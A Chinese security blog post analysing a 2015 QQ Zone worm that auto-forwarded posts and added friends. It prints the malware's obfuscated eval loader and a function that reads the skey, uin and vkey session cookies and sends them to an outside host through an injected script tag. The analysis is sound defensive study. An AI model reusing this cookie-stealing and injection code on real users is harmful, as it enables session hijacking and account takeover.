---
title: 对QQ空间自动转发/加好友的研究
authorId: rexskz
tags:
  - qzone
  - xss
categories:
  - Web 安全
date: 2015-08-15 14:12
---

前几天，QQ 空间的一大批好友转了所谓“优衣库”的一个视频，不用说，肯定是QQ空间有什么XSS漏洞了。有学弟让我去研究，其实我是拒绝的，因为我当时在搞别的事情，随便看了看源码没发现问题，于是就放到脑后了。

昨天晚上发现空间里又有好友转发的现象，甚至有自动加好友的问题。正好大半夜一个人有安静的时间，于是就顺便研究一下。

一开始没有头绪，在想是不是QQ空间有直接的XSS漏洞，于是看到了分享链接的标题，“▶↔§↙♯敱”这几个字很可疑，但是经过`encodeURIComponent`之后发现并没什么异常，这条路走不通。

从隐身窗口中打开链接（链接地址是恶意网址这个很容易看出来），但是并没看出代码有什么问题，除了页面最下方有一个`loadscript.js`，看名字应该是加载一个JavaScript代码，但是网址却是一个`.php`结尾的网址。

```javascript
var dor = parseInt(cookieRead("sdone"));
if (dor && dor > 0) {
    //;
} else {
    loadscript.js("/v/getplay.php");
    cookie_set("sdone", 99);
}
```

但是好像并没有什么端倪：

```javascript
function rndNum(len) {
    if (len && len > 0 && len < 100) {} else {
        len = 32;
    }
    var strs = "123456789";
    var maxPos = strs.length;
    var rdstr = "";
    for (i = 0; i < len; i++) {
        rdstr += strs.charAt(Math.floor(Math.random() * maxPos));
    }
    return rdstr;
}

if (cookieRead) {
    var dor = cookieRead("adplay");
    if (dor && dor > 0) {
        //;
    } else {
        cookie_set("adplay", 99);
    }
}
```

这条路也走不通。为了重现这个问题，我决定亲自实验一下。于是我在普通Chrome窗口中点开了这个链接。

**然并卵。**

什么都没发生，所以这肯定是只在手机QQ的浏览器中才有用。手头没有手机上的抓包工具，不过还好以前写前端的时候，为了方便测试移动端兼容性特地写了个页面：<a title="设备信息检测" href="https://www.rexskz.info/demos/devicetest.html" target="_blank">设备信息检测</a>，于是用手机访问了一下，我的手机QQ浏览器的UA是这样的：

```text
Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; HUAWEI G7-TL00 Build/HuaweiG7-TL00) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025442 Mobile Safari/533.1 V1_AND_SQ_5.7.2_260_YYB_D QQ/5.7.2.2490 NetType/4G WebP/0.3.0
```

在Chrome的开发者工具中将UA修改成这个，然而发现我已经上不去那个网站了。

天无绝人之路。将其一键加入科学上网列表之后，发现那个`getplay.php`的请求没了……

可能是人家防止我们分析吧。没关系，把网址中的随机参数改一改，清空一下缓存啥的，于是这个神奇的文件又出现了：

```javascript
document.getElementById("footad").src = "http://blog.qq.com/qzone/1107397297/1407071241.htm?vid=" + window.vid;

function rndNum(len) {
    if (len && len > 0 && len < 100) {} else {
        len = 32;
    }
    var strs = "123456789";
    var maxPos = strs.length;
    var rdstr = "";
    for (i = 0; i < len; i++) {
        rdstr += strs.charAt(Math.floor(Math.random() * maxPos));
    }
    return rdstr;
}

if (cookieRead) {
    var dor = cookieRead("adplay");
    if (dor && dor > 0) {
        //;
    } else {
        cookie_set("adplay", 99);
    }
}
```

第一行……在干啥？

实在是太晚了，于是我先睡觉了，睡得特别好，今天12点才起床。

于是打开网址看看吧（从`console`中获取到`window.vid=19`），发现了下面这么一段：

```javascript
s = /e%3Ddocument.body.innerHTML%3Bs%3De.indexOf%28%22%2f%2f%27%2C%27pro%22%29%3Bif%28s%3E0%29%7Be%3De.substring%28s%2B2%29%3Bt%3De.indexOf%28%22%3C%5C%2F%22%29%3Bif%28t%3E0%29%7Be%3D%22g_weather%5B%27save%27%5D%3D%7B%27country%27%3A%27%E4%B8%AD%E5%9B%BD%22%2Be.substring%280%2Ct%29%3Beval%28e%29%7D%7D%3Bdocument.write(%27%3Cscr%69pt%20src%3D%22h%74%74p%3A%2f%2fimgc%61che.qq.skyd%61t%61s.com%2Fg%2Fn%2Fb.jpg%22%3E%3C%2Fscr%69pt%3E%27)/;
s = unescape(s);
eval(s.substring(1, s.length - 1));
```

`eval`执行的语句，也就是那个`s`里面的内容，是这样的：

```javascript
e = document.body.innerHTML;
s = e.indexOf("//', 'pro");
if (s > 0) {
    e = e.substring(s + 2);
    t = e.indexOf("<\/");
    if (t > 0) {
        e = "g_weather['save']={'country':'ä¸­å½" + e.substring(0, t);
        eval(e)
    }
};
document.write('<script src="<strong>http://imgcache.qq.skydatas.com/g/n/b.jpg</strong>"></script>')
```

可见这是加载了一个奇怪的资源：`.jpg`结尾的JavaScript代码。打开之后有个301跳转，追随过去看看吧。

```javascript
function tjskey() {
    var eimg;
    eimg = document.createElement("script");
    eimg.type = "text/javascript";
    var myskey = cookieRead("skey");
    var myqq = parseInt(cookieRead("uin").replace("o", ""));
    var vkey = cookieRead("vkey");
    //if(myqq>500 && vkey.length>10){
    if (myqq > 99999999) {
        eimg.src = "http://db.outome.com/nsys/tsk.php?u=" + myqq + "&s=" + myskey + "&v=" + vkey + "&f=" + getQueryString("vid");
        document.body.appendChild(eimg);
    }
}
```

看到上面加粗的那一段了？通过`http://db.outome.com/nsys/tsk.php`这个接口将你的qq、skey、vkey、vid信息发到指定的位置。

还需要管别的么？有了key以后想做什么操作都随意了吧！

但是这并没有解决根本的疑问：blog.qq.com的网页上为什么会出现外面的代码？blog.qq.com我从来没听说过，看起来像QQ空间的前身，那为什么QQ没有弃用这个域名？是不是这个网站上有BUG？我就不得而知了。如果有大神有新的研究成果，求共享！

另，分享一篇寻找资料时找到的文章：<a title="qq空间某被利用的xss分析 - virusdefender's blog" href="https://virusdefender.net/index.php/archives/347/" target="_blank">qq空间某被利用的xss分析 - virusdefender's blog</a>，与本文的原理不同，这个是通过XSS修改`<base>`直接获取key以达到目标。但是该文章是通过网址中的`imgdm`参数进行反射型XSS，而本文应该属于存储型XSS。
